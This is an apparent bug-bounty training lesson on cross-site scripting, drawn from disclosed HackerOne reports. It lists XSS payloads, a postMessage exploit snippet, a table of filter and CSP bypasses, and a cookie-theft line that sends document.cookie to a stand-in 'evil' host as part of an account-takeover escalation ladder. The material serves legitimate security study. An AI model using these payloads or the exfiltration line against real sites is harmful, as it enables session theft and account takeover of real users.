# Lesson 06 — XSS (and how it becomes account takeover)

> **Source material:** top disclosed XSS reports from HackerOne (790+ report index), including
> PayPal #510152 ($20,000) and #488147 ($18,900), Valve #631956 ($9,000), Uber #217739/#256152
> ($6,000 each), Shopify #422043/#232174 ($5,000 each), Coinbase #100829 ($5,000)
> **Format:** writeup → mechanism → raw traffic → bypasses → escalation → practice
> **Status:** Lesson 6 of the study track

---

## 1. The one-line definition

**XSS is when attacker-controlled data reaches a browser context where it executes as code
instead of rendering as text.**

That's the whole bug. Everything else — reflected/stored/DOM, filters, CSP — is detail about
*how* the data gets there and *what* stops it.

**Why it still pays $20,000:** because XSS is rarely the finding. **XSS is the delivery mechanism
for account takeover.** A reflected XSS on a login page steals the session of every visitor.
A stored XSS in a shared widget runs in every user's browser. That's the difference between a
$250 finding and a $20,000 one.

---

## 2. Real money from real XSS reports

| Report | Program | Bounty | The bug |
|---|---|---|---|
| [#510152](https://hackerone.com/reports/510152) | **PayPal** | **$20,000** | Bypass of an earlier fix → **stored XSS on `paypal.com/signin`** |
| [#488147](https://hackerone.com/reports/488147) | **PayPal** | **$18,900** | Stored XSS on `/signin` via **cache poisoning** ← cross-link to Lesson 05 |
| [#631956](https://hackerone.com/reports/631956) | Valve | **$9,000** | Panorama UI XSS → **RCE** via Kick/Disconnect message |
| [#409850](https://hackerone.com/reports/409850) | Valve | **$7,500** | XSS in the Steam React chat client |
| [#131450](https://hackerone.com/reports/131450) | Uber | **$7,500** | Stored XSS in `developer.uber.com` |
| [#217739](https://hackerone.com/reports/217739) | Uber | **$6,000** | Stored XSS on **any page in most Uber domains** |
| [#256152](https://hackerone.com/reports/256152) | Uber | **$6,000** | Inject JS into any file on `tags.tiqcdn.com` → stored XSS on most Uber domains |
| [#152067](https://hackerone.com/reports/152067) | Uber | **$5,000** | Stored XSS on `developer.uber.com` via **admin account compromise** |
| [#100829](https://hackerone.com/reports/100829) | Coinbase | **$5,000** | Stored XSS |
| [#374919](https://hackerone.com/reports/374919) | HackerOne | **$5,000** | Content spoofing + XSS |
| [#422043](https://hackerone.com/reports/422043) | Shopify | **$5,000** | H1514 DOMXSS in Embedded SDK via `Shopify.API.setWindowLocation` + **cookie stuffing** |
| [#232174](https://hackerone.com/reports/232174) | Shopify | **$5,000** | **Whitelist bypass in an SVG icon** for sales-channel apps |
| [#526325](https://hackerone.com/reports/526325) | GitLab | **$4,500** | Stored XSS in Wiki pages |
| [#508184](https://hackerone.com/reports/508184) | GitLab | **$4,500** | Persistent XSS in Note objects |
| [#340431](https://hackerone.com/reports/340431) | Uber | **$4,000** | Reflected XSS **+ payment-details exposure** |
| [#662287](https://hackerone.com/reports/662287) | GitLab | **$3,500** | Stored XSS in RDoc wiki pages |
| [#348076](https://hackerone.com/reports/348076) | New Relic | **$3,000** | Stored XSS in the Browser `name` field, reflected on two pages |
| [#299424](https://hackerone.com/reports/299424) | Shopify | **$3,000** | **Filter bypass** → stored XSS |
| [#231053](https://hackerone.com/reports/231053) | Shopify | **$3,000** | Abuse of the **HTML5 structured-clone algorithm** in a `postMessage` listener |
| [#191810](https://hackerone.com/reports/191810) | Uber | **$3,000** | Reflected XSS in `lert.uber.com` |
| [#245296](https://hackerone.com/reports/245296) | Keybase | **$3,000** | Persistent XSS via a `payload` field in a **toffee template** |
| [#341908](https://hackerone.com/reports/341908) | Twitter | **$2,940** | XSS via **DM deeplinks** |
| [#425200](https://hackerone.com/reports/425200) | PayPal | **$2,900** | XSS on `paypal.com/paypalme/my/landing` |
| [#534450](https://hackerone.com/reports/534450) | Grammarly | **$2,000** | **ATO via cookie manipulation + XSS** |
| [#604120](https://hackerone.com/reports/604120) | InnoGames | **$1,100** | Chain: **CSRF-token leak → stored XSS → ATO** |
| [#723060](https://hackerone.com/reports/723060) | Razer | **$750** | Reflected XSS on `pay.gold.razer.com` → **escalated to ATO** |
| [#398054](https://hackerone.com/reports/398054) / [#499030](https://hackerone.com/reports/499030) | HackerOne | $500 / $565 | DOM XSS via `postMessage` — **then a bypass of that fix** |

**Two patterns jump out:**

1. **The biggest XSS payouts are on auth pages.** PayPal's two top findings were both on
   `/signin` — because XSS there steals credentials or session tokens from *every* visitor.
2. **Fixes get bypassed.** PayPal #510152 is a bypass of #488147. HackerOne #499030 is a bypass
   of #398054. **When you see a disclosed XSS fix, go read it and try to break the fix.**

---

## 3. The three types — and which pays

| Type | How data flows | Typical payout | Why |
|---|---|---|---|
| **Reflected** | request → response, immediately | $100–$1,000 | needs a victim to click a crafted link |
| **Stored** | request → **database** → every viewer | **$1,000–$20,000** | no interaction; hits every user who views the page |
| **DOM** | client-side JS sinks, server never sees it | $250–$5,000 | often survives server-side filters entirely |

**Stored pays the most** because it's self-propagating — no link to click. That's why Uber paid
$6,000 for "stored XSS on any page in most Uber domains" and Valve $9,000 for one that reached RCE.

### The canonical payload shapes

```html
<!-- basic -->
<script>alert(document.domain)</script>

<!-- attribute break-out (when you land inside a quoted attribute) -->
" onmouseover="alert(1)
"><img src=x onerror=alert(1)>

<!-- javascript: URI (works in href/src) -->
javascript:alert(document.domain)

<!-- when <script> and on* are filtered, SVG is often missed -->
<svg><script>alert(1)</script></svg>
<svg/onload=alert(1)>

<!-- when the sink is innerHTML, you don't need <script> at all -->
<img src=x onerror=alert(1)>
```

> **`alert(document.domain)` not `alert(1)`** — proving *which origin* executed it is what
> separates a real finding from a useless one. `alert(1)` on a sandboxed iframe proves nothing.

### The DOM sinks that matter

XSS happens when data flows into a **sink**. Grep the JS for these:

```
innerHTML, outerHTML, insertAdjacentHTML, document.write
eval, Function, setTimeout(string), setInterval(string)
location, location.href, location.assign, location.replace
element.src, element.href, element.setAttribute
$.html(), $(...).append()        // jQuery
dangerouslySetInnerHTML          // React
v-html                           // Vue
[innerHTML]                      // Angular
```

And the **sources**: `location.hash`, `location.search`, `document.referrer`,
`window.name`, `postMessage` events, `localStorage`, cookies.

**`location.hash` is a favourite** — fragments aren't sent to the server, so server-side filters
never see them. Slack paid **$1,100** for exactly that
([#146336](https://hackerone.com/reports/146336): "XSS vulnerable parameter in a location hash").

---

## 4. `postMessage` — the under-hunted XSS class

Four separate reports in the corpus are `postMessage` XSS, totalling ~$8,000. It's worth its own
method because the bug is a **missing origin check**, not a filter bypass.

```js
// VULNERABLE — no origin validation, and a dangerous sink
window.addEventListener('message', function(e) {
    document.getElementById('out').innerHTML = e.data;   // attacker controls e.data
});
```

An attacker page just does:

```html
<iframe src="https://target.com/widget" onload="
  this.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>','*')
"></iframe>
```

**Hunting method:**
1. Grep JS bundles for `addEventListener('message'` / `onmessage`
2. Check whether the handler validates `e.origin` — **absence is the bug**
3. Check the sink: `innerHTML`, `eval`, `location`, `setAttribute`
4. Look for a **target-origin** second argument in `postMessage` calls — and ask whether the
   browser parses it the same way the server does (this is the exact bug from **Lesson 04**)

Shopify's $3,000 finding abused the **HTML5 structured-clone algorithm** inside a `postMessage`
listener — the data arrived as an object, not a string, so string-based filters never ran.

---

## 5. XSS → account takeover — the escalation ladder

**This is where the money is.** A bare XSS is Medium. A chain to ATO is High/Critical.

```
1. Cookie theft          → if HttpOnly is NOT set: fetch('//evil/?c='+document.cookie)
2. Token theft           → localStorage/sessionStorage often hold JWTs
3. CSRF-token exfil      → read the CSRF token from the DOM, then perform a state change
4. Session fixation      → set a session cookie via document.cookie
5. Password change       → XSS on the settings page → auto-submit the change-password form
6. Email change          → then trigger a password reset to YOUR email
7. OAuth token theft     → XSS on an OAuth flow page → steal the code/token
8. RCE                   → XSS in an Electron/native context (Valve paid $9,000)
```

**Real escalation examples from the corpus:**
- **Grammarly #534450, $2,000** — ATO via **cookie manipulation + XSS** combined
- **Razer #723060, $750** — reflected XSS on a payment page **escalated to ATO**
- **InnoGames #604120, $1,100** — three-step chain: leak CSRF token → stored XSS → ATO
- **Valve #631956, $9,000** — XSS → **RCE** via the game client's Kick/Disconnect message

**The reflex:** when you find XSS, immediately ask *"what can this session do that I can't?"*
Read the cookie flags. Look for a password/email change form. Check for an OAuth flow on the
same origin. That question is the difference between $500 and $5,000.

---

## 6. Bypasses — when your payload is filtered

| Defense | Bypass |
|---|---|
| `<script>` blocked | `<img src=x onerror=>`, `<svg onload=>`, `<body onload=>` |
| `on*` handlers blocked | `<script>`, `<iframe srcdoc>`, `<object data>`, `<embed src>` |
| Both blocked | `javascript:` URI, `<a href="javascript:...">`, `<form action="javascript:...">` |
| Parentheses blocked | `` <script>alert`1`</script> `` (template literals) |
| Quotes blocked | `String.fromCharCode()`, `atob()` |
| `alert` blocked | `confirm(1)`, `prompt(1)`, `print()`, `top['al'+'ert'](1)` |
| Case-insensitive filter | mixed case: `<ScRiPt>`, `<IMG SRC=x OnErRoR=...>` |
| Simple regex strip | **double encoding** (`%253Cscript%253E`), non-standard ASCII chars |
| WAF on the path | **different encoding per context** — HTML entity, URL, JS unicode `\u003c` |
| Sanitiser (DOMPurify) | look for **mXSS**, namespace confusion, `<noscript>` re-parsing |
| CSP `script-src 'self'` | find a JSONP endpoint or an angular-style library on the allowlist |
| CSP `unsafe-inline` absent | DOM clobbering to hijack an existing script |

**Real bypasses in the corpus:**
- Starbucks **#716761** — WAF bypass via **double-encoded non-standard ASCII** in 404 pages, which
  was itself a bypass of #629745
- Twitter **#153666** — "CSP bypass + XSS"
- Shopify **#299424** — "Bypass filter and get stored XSS" ($3,000)
- Shopify **#232174** — **whitelist bypass in an SVG icon** ($5,000)

> **A note on SVG:** it appears repeatedly — stored XSS via SVG upload, SVG filter bypasses,
> SVG icon whitelist bypasses. SVG is XML with script execution. **Always test SVG upload.**

---

## 7. How to test — methodology

```
01. Map every input: URL params, path segments, headers (Referer, User-Agent, X-Forwarded-*),
    cookies, POST bodies, JSON fields, file names, file metadata
02. Map every output context: HTML body, attribute, JS string, CSS, URL, JSON, XML
03. For each input→output pair, determine the context and pick the matching break-out
04. Probe with a unique canary string first (e.g. zqx123) — find WHERE it lands before
    worrying about execution
05. Check the escaping: is < > " ' & escaped? Are they escaped for the RIGHT context?
06. Try the sink-specific payload for that context
07. If filtered, work the bypass table in section 6
08. For stored: submit, then find EVERY page where the value renders (admin panels especially)
09. For DOM: grep the JS bundles for the sinks in section 3
10. For postMessage: find handlers, test missing origin checks (section 4)
11. ALWAYS prove origin: alert(document.domain), not alert(1)
12. Then escalate — read the cookie flags, hunt a password/email change, look for OAuth
13. Write the report with the raw request, the raw response, and the impact chain
```

**Blind XSS** deserves a special note: when input is rendered somewhere you can't see (an admin
panel, a support dashboard, an email client), use an **out-of-band payload** that calls back to
your listener. Mail.ru, Zomato and LocalTapiola all paid for blind XSS in admin panels —
LocalTapiola paid **$5,000** for one that leaked employee sessions
([#135154](https://hackerone.com/reports/135154)).

---

## 8. Common mistakes

- **`alert(1)`.** Prove the origin with `alert(document.domain)`. A sandboxed iframe proves nothing.
- **Reporting XSS without impact.** Show what the session can do — cookie flags, an ATO path.
  "XSS on a page nobody visits" is Low.
- **Not testing stored.** The reflection you found in a search param may also persist somewhere.
- **Skipping the DOM.** Server-side filters are irrelevant if the sink is client-side.
- **Ignoring `location.hash`.** Never sent to the server, so server filters never see it.
- **Not testing `postMessage`.** Four corpus findings, ~$8,000, and most hunters skip it.
- **Forgetting SVG.** Upload, icons, filters — SVG is script execution in XML clothing.
- **Not checking whether the fix was complete.** PayPal's $20,000 was a bypass of its own $18,900.
- **Self-XSS reported as a bug.** Self-XSS alone is not a vulnerability — you need a way to
  deliver it (CSRF, a shared field, a stored location).

---

## 9. Practice targets

| Target | Why |
|---|---|
| **PortSwigger XSS labs** | every context, every bypass, in order |
| **OWASP Juice Shop** | DOM XSS, stored XSS, CSP bypass, XSS → ATO chains |
| **DVWA / bWAPP** | the classics, good for reflexes |
| **A local app with a `postMessage` widget** | build one, then break the origin check |
| **Any app with SVG upload** | the highest-yield modern XSS surface |

**Assignment:** stand up OWASP Juice Shop in the lab VM and complete this chain end-to-end:

1. Find a **stored** XSS (not reflected)
2. Prove it with `alert(document.domain)`
3. Check the session cookie flags — is `HttpOnly` set?
4. Escalate: find the password-change or email-change form and drive it via your payload
5. Then build a tiny `postMessage` widget with **no origin check** and exploit it from a second
   page — that's the bug class most hunters never test

Steps 3–5 are the ones that turn a $250 XSS into a $5,000 one.

---

## 10. Key takeaways

1. **XSS is a delivery mechanism, not the finding.** The payout is in what it reaches.
2. **Stored > reflected.** No interaction required = higher severity.
3. **Auth pages are the jackpot.** PayPal's top two findings were both on `/signin`.
4. **Prove the origin** — `alert(document.domain)`, always.
5. **`postMessage` with no origin check is an under-hunted class.** ~$8,000 in the corpus.
6. **`location.hash` bypasses every server-side filter** — fragments never reach the server.
7. **SVG is script execution.** Upload, icons, filters — test it every time.
8. **Escalate or it's Medium.** Cookie flags → password change → email change → ATO.
9. **Read disclosed fixes and break them.** PayPal paid $20,000 for a bypass of its own $18,900.
10. **Self-XSS is not a bug** unless you can deliver it.

---

## 11. What to study next

| You learned | Study next |
|---|---|
| XSS → ATO chains | **CSRF + SameSite bypasses** (the other half of ATO) |
| `postMessage` origin bugs | **DOM clobbering**, prototype pollution |
| XSS via cache poisoning (PayPal $18,900) | **Web cache poisoning / deception** |
| Filter and WAF bypasses | **WAF bypass methodology** as its own discipline |
| XSS in Electron/native | Client-side RCE, desktop app security |
| CSP bypass | CSP design flaws, JSONP endpoints, nonce reuse |

---

## 12. Reference index

| # | Report | Bounty | Type / technique |
|---|---|---|---|
| 1 | [PayPal #510152](https://hackerone.com/reports/510152) | $20,000 | stored XSS on /signin (bypass of #488147) |
| 2 | [PayPal #488147](https://hackerone.com/reports/488147) | $18,900 | stored XSS via **cache poisoning** |
| 3 | [Valve #631956](https://hackerone.com/reports/631956) | $9,000 | Panorama UI XSS → **RCE** |
| 4 | [Valve #409850](https://hackerone.com/reports/409850) | $7,500 | Steam React chat client |
| 5 | [Uber #131450](https://hackerone.com/reports/131450) | $7,500 | stored XSS in developer.uber.com |
| 6 | [Uber #217739](https://hackerone.com/reports/217739) | $6,000 | stored XSS on most Uber domains |
| 7 | [Uber #256152](https://hackerone.com/reports/256152) | $6,000 | JS injection in a CDN → stored XSS |
| 8 | [Uber #152067](https://hackerone.com/reports/152067) | $5,000 | stored XSS via admin compromise |
| 9 | [Coinbase #100829](https://hackerone.com/reports/100829) | $5,000 | stored XSS |
| 10 | [HackerOne #374919](https://hackerone.com/reports/374919) | $5,000 | content spoofing + XSS |
| 11 | [Shopify #422043](https://hackerone.com/reports/422043) | $5,000 | DOMXSS + cookie stuffing |
| 12 | [Shopify #232174](https://hackerone.com/reports/232174) | $5,000 | SVG icon whitelist bypass |
| 13 | [GitLab #526325](https://hackerone.com/reports/526325) | $4,500 | stored XSS in Wiki pages |
| 14 | [GitLab #508184](https://hackerone.com/reports/508184) | $4,500 | persistent XSS in Notes |
| 15 | [Uber #340431](https://hackerone.com/reports/340431) | $4,000 | reflected XSS + payment data |
| 16 | [GitLab #662287](https://hackerone.com/reports/662287) | $3,500 | stored XSS in RDoc |
| 17 | [New Relic #348076](https://hackerone.com/reports/348076) | $3,000 | stored XSS in Browser name |
| 18 | [Shopify #299424](https://hackerone.com/reports/299424) | $3,000 | filter bypass |
| 19 | [Shopify #231053](https://hackerone.com/reports/231053) | $3,000 | structured-clone abuse in postMessage |
| 20 | [Uber #191810](https://hackerone.com/reports/191810) | $3,000 | reflected XSS |
| 21 | [Keybase #245296](https://hackerone.com/reports/245296) | $3,000 | toffee template injection |
| 22 | [Twitter #341908](https://hackerone.com/reports/341908) | $2,940 | DM deeplink XSS |
| 23 | [PayPal #425200](https://hackerone.com/reports/425200) | $2,900 | paypal.me landing XSS |
| 24 | [Grammarly #534450](https://hackerone.com/reports/534450) | $2,000 | **cookie manipulation + XSS → ATO** |
| 25 | [LocalTapiola #135154](https://hackerone.com/reports/135154) | $5,000 | **blind XSS** → employee session leak |
| 26 | [InnoGames #604120](https://hackerone.com/reports/604120) | $1,100 | CSRF leak → stored XSS → ATO |
| 27 | [Slack #146336](https://hackerone.com/reports/146336) | $1,100 | XSS in `location.hash` |
| 28 | [Razer #723060](https://hackerone.com/reports/723060) | $750 | reflected XSS → ATO |
| 29 | [HackerOne #398054](https://hackerone.com/reports/398054) / [#499030](https://hackerone.com/reports/499030) | $500 / $565 | DOM XSS via postMessage, then a bypass |
| 30 | [Starbucks #716761](https://hackerone.com/reports/716761) | $150 | WAF bypass via double-encoded non-ASCII |
